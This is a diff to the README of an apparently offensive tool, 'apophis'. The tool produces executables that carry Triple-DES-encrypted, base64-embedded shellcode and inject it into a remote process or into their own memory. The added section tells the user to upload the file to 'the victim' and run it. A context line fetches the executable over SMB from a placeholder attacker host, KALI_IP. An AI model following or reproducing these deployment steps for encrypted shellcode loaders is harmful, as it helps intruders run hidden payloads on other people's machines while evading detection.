@@ -136,7 +136,7 @@ cmd> des_decryptor.exe smb://KALI_IP/des_decryptor_embedded_marshal.exe
 The executable ```des_decryptor_embeded.exe``` embeds the shellcode in base64, which before was ecrypted with ```TripleDESEncryptor.ps1```. Doesn't need command-line arguments for the execution. 
 
 ```
-It will inject the shellcode into the remote process that you have provided in the ```line 11 of apophis.sh```
+It will inject the shellcode into the remote process that you have provided in the line 11 of apophis.sh
 ```
 
 **Steps**
@@ -145,6 +145,21 @@ It will inject the shellcode into the remote process that you have provided in t
 
 ```
 cmd> des_decryptor_embedded.exe
+```
+
+#### 1.1.3 Execution of des_decryptor_embedded_marshal.exe
+The executable ```des_decryptor_embedded_marshal.exe``` embeds the shellcode in base64, which before was ecrypted with ```TripleDESEncryptor.ps1```. Doesn't need command-line arguments for the execution. 
+
+```
+It will inject the shellcode to a memory space inside des_decryptor_embedded_marshal.exe process.
+```
+
+**Steps**
+- Upload the file to the victim
+- Execute it as follows:
+
+```
+cmd> des_decryptor_embedded_marshal.exe
 ```
 
 
